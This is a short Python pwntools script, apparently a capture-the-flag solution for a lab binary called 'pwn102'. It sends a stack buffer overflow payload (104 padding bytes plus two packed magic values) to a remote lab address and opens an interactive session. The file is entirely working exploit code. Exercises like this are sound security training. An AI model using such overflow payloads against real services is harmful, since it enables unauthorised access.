from pwn import *

#io = process("./pwn102")
io = remote("10.10.166.74", 9002)

#payload = b"A"*104 + b"\xd3\xc0" + b"\x33\xff\xc0"
payload = b"A"*104 + p32(0xc0d3) + p32(0xc0ff33)

f = open("payload", "wb")
f.write(payload)
f.close()

io.sendlineafter("?", payload)

io.interactive()
